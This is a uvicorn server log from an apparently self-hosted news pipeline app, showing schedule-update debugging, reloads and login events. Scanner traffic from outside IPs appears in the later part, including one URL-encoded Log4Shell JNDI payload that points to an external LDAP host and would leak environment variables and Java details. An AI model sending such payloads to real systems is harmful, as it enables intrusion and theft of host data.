The virtual environment was not created successfully because ensurepip is not
available.  On Debian/Ubuntu systems, you need to install the python3-venv
INFO:     127.0.0.1:33332 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:33354 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54642 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:54644 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:35052 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:35056 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:35060 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:35076 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:35090 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:35112 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:35106 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:35116 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:44994 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:45006 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:45018 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:45026 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:53872 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:53880 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:53894 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:47766 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:47780 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:47534 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:34352 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:34362 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:34366 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:34372 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:34378 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:58250 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:58266 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:50544 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:50546 - "GET /pipelines HTTP/1.1" 200 OK
WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [813098]
INFO:     Started server process [813633]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     127.0.0.1:38652 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:38668 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:38672 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:38680 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:38684 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:38696 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:38698 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54966 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54980 - "GET /pipelines/9 HTTP/1.1" 200 OK
WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [813633]
INFO:     Started server process [813796]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
WARNING:  WatchFiles detected changes in 'backend/db.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [813796]
INFO:     Started server process [813831]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [813831]
INFO:     Started server process [813986]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [813986]
INFO:     Started server process [814034]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     127.0.0.1:48948 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:48942 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:48952 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:48966 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:48982 - "GET /pipelines/9 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=9 payload.pipeline={'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'debug_enabled': None, 'weekdays_json': None}; raw={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'weekdays_json': '5', 'description': 'aa'}}
[DEBUG] update_pipeline pid=9 model_dump_before_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': None}}
[DEBUG] update_pipeline pid=9 model_dump_after_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': '5'}}
[DEBUG] update pipeline pid=9 weekdays_json=None
INFO:     127.0.0.1:54954 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54956 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54982 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:54968 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:54994 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:55006 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:55020 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:40704 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:40718 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:43230 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:43242 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:43248 - "GET /pipelines/9 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=9 payload.pipeline={'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'debug_enabled': None, 'weekdays_json': None}; raw={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'weekdays_json': '5', 'description': 'aa'}}
[DEBUG] update_pipeline pid=9 model_dump_before_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': None}}
[DEBUG] update_pipeline pid=9 model_dump_after_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': '5'}}
[DEBUG] update pipeline pid=9 weekdays_json=None
INFO:     127.0.0.1:35326 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:35332 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54478 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:54486 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54500 - "GET /pipelines/9 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=9 payload.pipeline={'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'debug_enabled': None, 'weekdays_json': None}; raw={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'weekdays_json': '5', 'description': 'aa'}}
[DEBUG] update_pipeline pid=9 model_dump_before_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': None}}
[DEBUG] update_pipeline pid=9 model_dump_after_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': '5'}}
[DEBUG] update pipeline pid=9 weekdays_json=None
INFO:     127.0.0.1:54504 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54516 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:38782 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:38784 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:38790 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:34838 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:34840 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:34846 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:45728 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:45732 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:45746 - "GET /pipelines/9 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=9 payload.pipeline={'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'debug_enabled': None, 'weekdays_json': None}; raw={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'weekdays_json': None, 'description': 'aa'}}
[DEBUG] update_pipeline pid=9 model_dump_before_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': None}}
[DEBUG] update_pipeline pid=9 model_dump_after_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': None}}
[DEBUG] update pipeline pid=9 weekdays_json=None
INFO:     127.0.0.1:54466 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:54478 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:47300 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:47308 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:47320 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:47326 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:47338 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:52552 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:52568 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:52576 - "GET /pipelines/9 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=9 payload.pipeline={'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'debug_enabled': None, 'weekdays_json': [3, 4, 5]}; raw={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'weekdays_json': [3, 4, 5], 'description': 'aa'}}
[DEBUG] update_pipeline pid=9 model_dump_before_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': [3, 4, 5]}}
[DEBUG] update_pipeline pid=9 model_dump_after_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': [3, 4, 5]}}
[DEBUG] update pipeline pid=9 weekdays_json=[3, 4, 5]
INFO:     127.0.0.1:52592 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:52608 - "GET /pipelines/9 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=9 payload.pipeline={'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'debug_enabled': None, 'weekdays_json': [2, 3, 4, 5]}; raw={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'weekdays_json': [2, 3, 4, 5], 'description': 'aa'}}
[DEBUG] update_pipeline pid=9 model_dump_before_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': [2, 3, 4, 5]}}
[DEBUG] update_pipeline pid=9 model_dump_after_merge={'pipeline': {'name': 'feishu_all_week_1_to_5', 'enabled': 1, 'description': 'aa', 'weekdays_json': [2, 3, 4, 5]}}
[DEBUG] update pipeline pid=9 weekdays_json=[2, 3, 4, 5]
INFO:     127.0.0.1:51972 - "PUT /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:51984 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:51992 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:51994 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:52008 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:52024 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:52038 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:55866 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:55868 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:55870 - "GET /pipelines/9 HTTP/1.1" 200 OK
WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [814034]
INFO:     Started server process [814335]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [814335]
INFO:     Started server process [814343]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
INFO:     127.0.0.1:36976 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:36984 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:37000 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:37012 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:37018 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:40594 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:40596 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:40598 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:40614 - "GET /options HTTP/1.1" 200 OK
WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [814343]
INFO:     Started server process [814354]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
WARNING:  WatchFiles detected changes in 'backend/main.py'. Reloading...
INFO:     Shutting down
INFO:     Waiting for application shutdown.
INFO:     Application shutdown complete.
INFO:     Finished server process [814354]
INFO:     Started server process [814389]
INFO:     Waiting for application startup.
INFO:     Application startup complete.
[DEBUG] insert pipeline weekdays_json=[1]
INFO:     127.0.0.1:57502 - "POST /pipelines HTTP/1.1" 201 Created
INFO:     127.0.0.1:57514 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:57522 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:45804 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:45816 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:45830 - "GET /pipelines/10 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=10 payload.pipeline={'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'debug_enabled': None, 'weekdays_json': [1, 7]}; raw={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'weekdays_json': [1, 7], 'description': ''}}
[DEBUG] update_pipeline pid=10 model_dump_before_merge={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'weekdays_json': [1, 7]}}
[DEBUG] update_pipeline pid=10 model_dump_after_merge={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'weekdays_json': [1, 7]}}
[DEBUG] update pipeline pid=10 weekdays_json=[1, 7]
INFO:     127.0.0.1:58376 - "PUT /pipelines/10 HTTP/1.1" 200 OK
INFO:     127.0.0.1:58384 - "GET /pipelines/10 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=10 payload.pipeline={'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'debug_enabled': None, 'weekdays_json': [1]}; raw={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'weekdays_json': [1], 'description': ''}}
[DEBUG] update_pipeline pid=10 model_dump_before_merge={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'weekdays_json': [1]}}
[DEBUG] update_pipeline pid=10 model_dump_after_merge={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'weekdays_json': [1]}}
[DEBUG] update pipeline pid=10 weekdays_json=[1]
INFO:     127.0.0.1:40724 - "PUT /pipelines/10 HTTP/1.1" 200 OK
INFO:     127.0.0.1:40728 - "GET /pipelines/10 HTTP/1.1" 200 OK
INFO:     127.0.0.1:57486 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:57498 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:57512 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:57524 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:57536 - "GET /pipelines/9 HTTP/1.1" 200 OK
INFO:     127.0.0.1:40716 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:40726 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:38978 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:38990 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:39000 - "GET /pipelines/10 HTTP/1.1" 200 OK
[DEBUG] update_pipeline pid=10 payload.pipeline={'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'debug_enabled': None, 'weekdays_json': [1]}; raw={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'weekdays_json': [1], 'description': ''}, 'writer': {'type': 'feishu_md', 'hours': 72, 'per_source_cap': 3, 'limit_per_category': {'default': 10, 'tech': 5}, 'weights_json': {'timeliness': 0.2, 'game_relevance': 0.2, 'mobile_game_relevance': 0.2, 'ai_relevance': 0.1, 'tech_relevance': 0.01, 'quality': 0.2, 'insight': 0.2, 'depth': 0.2, 'novelty': 0.2}, 'bonus_json': {'openai.research': 2, 'deepmind': 1, 'qbitai-zhiku': 1}}}
[DEBUG] update_pipeline pid=10 model_dump_before_merge={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'weekdays_json': [1]}, 'writer': {'type': 'feishu_md', 'hours': 72, 'weights_json': {'timeliness': 0.2, 'game_relevance': 0.2, 'mobile_game_relevance': 0.2, 'ai_relevance': 0.1, 'tech_relevance': 0.01, 'quality': 0.2, 'insight': 0.2, 'depth': 0.2, 'novelty': 0.2}, 'bonus_json': {'openai.research': 2, 'deepmind': 1, 'qbitai-zhiku': 1}, 'limit_per_category': {'default': 10, 'tech': 5}, 'per_source_cap': 3}}
[DEBUG] update_pipeline pid=10 model_dump_after_merge={'pipeline': {'name': 'feishu_all_monday', 'enabled': 1, 'description': '', 'weekdays_json': [1]}, 'writer': {'type': 'feishu_md', 'hours': 72, 'weights_json': {'timeliness': 0.2, 'game_relevance': 0.2, 'mobile_game_relevance': 0.2, 'ai_relevance': 0.1, 'tech_relevance': 0.01, 'quality': 0.2, 'insight': 0.2, 'depth': 0.2, 'novelty': 0.2}, 'bonus_json': {'openai.research': 2, 'deepmind': 1, 'qbitai-zhiku': 1}, 'limit_per_category': {'default': 10, 'tech': 5}, 'per_source_cap': 3}}
[DEBUG] update pipeline pid=10 weekdays_json=[1]
INFO:     127.0.0.1:40826 - "PUT /pipelines/10 HTTP/1.1" 200 OK
INFO:     127.0.0.1:40828 - "GET /pipelines/10 HTTP/1.1" 200 OK
INFO:     87.120.191.37:31514 - "GET /json/ HTTP/1.1" 401 Unauthorized
INFO:     207.90.244.28:33310 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     207.90.244.28:33312 - "GET /favicon.ico HTTP/1.1" 401 Unauthorized
INFO:     165.154.172.72:37582 - "GET / HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     152.32.245.186:52116 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     152.32.245.186:52298 - "GET /favicon.ico HTTP/1.1" 401 Unauthorized
INFO:     152.32.245.186:52432 - "GET /robots.txt HTTP/1.1" 401 Unauthorized
INFO:     152.32.245.186:52434 - "GET /sitemap.xml HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
INFO:     194.164.107.6:56082 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     185.180.141.50:36759 - "GET / HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     64.62.197.167:65210 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     64.62.197.175:53155 - "GET /?format=json HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
INFO:     127.0.0.1:60484 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:60474 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:60500 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:60498 - "GET /options HTTP/1.1" 200 OK
INFO:     127.0.0.1:60516 - "GET /pipelines/10 HTTP/1.1" 200 OK
INFO:     198.235.24.176:61968 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     198.235.24.255:59400 - "GET / HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
INFO:     162.142.125.214:48226 - "GET / HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     162.142.125.214:48248 - "GET /sitemap.xml HTTP/1.1" 401 Unauthorized
INFO:     87.121.84.50:37354 - "GET / HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
INFO:     87.121.84.50:37376 - "GET / HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     159.89.29.248:58080 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     3.132.23.201:51134 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     3.132.23.201:57422 - "GET / HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     204.76.203.18:58792 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     204.76.203.18:45318 - "GET /bins/ HTTP/1.1" 401 Unauthorized
INFO:     204.76.203.18:54890 - "GET /bin/ HTTP/1.1" 401 Unauthorized
INFO:     204.76.203.18:48618 - "GET /backup/ HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
WARNING:  Invalid HTTP request received.
INFO:     127.0.0.1:40454 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:40468 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:40478 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:40482 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:32900 - "GET /sources HTTP/1.1" 200 OK
INFO:     127.0.0.1:32904 - "GET /categories HTTP/1.1" 200 OK
INFO:     127.0.0.1:55202 - "GET /sources HTTP/1.1" 200 OK
INFO:     127.0.0.1:55212 - "GET /categories HTTP/1.1" 200 OK
INFO:     127.0.0.1:48700 - "GET /categories HTTP/1.1" 200 OK
INFO:     127.0.0.1:48706 - "GET /categories HTTP/1.1" 200 OK
INFO:     127.0.0.1:55320 - "GET /ai-metrics HTTP/1.1" 200 OK
INFO:     127.0.0.1:55322 - "GET /ai-metrics HTTP/1.1" 200 OK
INFO:     127.0.0.1:55324 - "GET /categories HTTP/1.1" 200 OK
INFO:     127.0.0.1:55334 - "GET /sources HTTP/1.1" 200 OK
INFO:     127.0.0.1:55350 - "GET /infos?page=1&page_size=20 HTTP/1.1" 200 OK
INFO:     127.0.0.1:55356 - "GET /categories HTTP/1.1" 200 OK
INFO:     127.0.0.1:55360 - "GET /sources HTTP/1.1" 200 OK
INFO:     127.0.0.1:55374 - "GET /infos?page=1&page_size=20 HTTP/1.1" 200 OK
INFO:     127.0.0.1:45306 - "GET /admin/users?page=1&page_size=20 HTTP/1.1" 200 OK
INFO:     127.0.0.1:45308 - "GET /admin/users?page=1&page_size=20 HTTP/1.1" 200 OK
INFO:     127.0.0.1:39998 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:40014 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     45.135.194.44:30891 - "GET /%24%7Bjndi%3Aldap%3A//45.135.194.44%3A1389/x_VkYUAfCgAXWwhpAAAAAPjpzM8/%24%7Bjava%3Aos%7D%3B~%24%7Bjava%3Aversion%7D%3B~%24%7Bjava%3Aruntime%7D%3B~%24%7Bjava%3Alocale%7D%3B~%24%7Bsys%3Ajava.class.path%7D%3B~%24%7Bsys%3Auser.country%7D%3B~%24%7Bsys%3Auser.timezone%7D%3B~%24%7Benv%3AUSER%7D%3B~%24%7Benv%3AUSERNAME%7D%3B~%24%7Benv%3APWD%7D%3B~%24%7Benv%3AHOSTNAME%7D%7D HTTP/1.1" 401 Unauthorized
INFO:     45.156.129.137:53583 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     45.156.129.138:59167 - "GET /helpdesk/WebObjects/Helpdesk.woa HTTP/1.1" 401 Unauthorized
INFO:     45.156.129.138:34429 - "GET /owncloud/status.php HTTP/1.1" 401 Unauthorized
INFO:     45.156.129.137:35209 - "GET /status.php HTTP/1.1" 401 Unauthorized
INFO:     45.156.129.137:42557 - "GET /api/session/properties HTTP/1.1" 401 Unauthorized
WARNING:  Invalid HTTP request received.
INFO:     45.156.129.136:53963 - "GET /admin/ HTTP/1.1" 401 Unauthorized
INFO:     45.156.129.137:53199 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     45.156.129.138:59751 - "GET / HTTP/1.1" 401 Unauthorized
INFO:     127.0.0.1:53848 - "GET /pipelines HTTP/1.1" 401 Unauthorized
INFO:     127.0.0.1:53854 - "GET /me HTTP/1.1" 401 Unauthorized
INFO:     127.0.0.1:53856 - "GET /me HTTP/1.1" 401 Unauthorized
INFO:     127.0.0.1:53864 - "GET /pipelines HTTP/1.1" 401 Unauthorized
[auth] login code sent to 3***@qq.com via local SMTP 127.0.0.1:25/sendmail
INFO:     127.0.0.1:56440 - "POST /auth/login/code HTTP/1.1" 200 OK
INFO:     127.0.0.1:40502 - "POST /auth/login/verify HTTP/1.1" 200 OK
INFO:     127.0.0.1:47768 - "POST /auth/logout HTTP/1.1" 200 OK
[auth] login code sent to p***@gmail.com via local SMTP 127.0.0.1:25/sendmail
INFO:     127.0.0.1:42564 - "POST /auth/login/code HTTP/1.1" 200 OK
INFO:     127.0.0.1:40344 - "POST /auth/login/verify HTTP/1.1" 200 OK
INFO:     127.0.0.1:40354 - "GET /pipelines HTTP/1.1" 200 OK
INFO:     127.0.0.1:40370 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:40382 - "GET /me HTTP/1.1" 200 OK
INFO:     127.0.0.1:40392 - "GET /pipelines HTTP/1.1" 200 OK
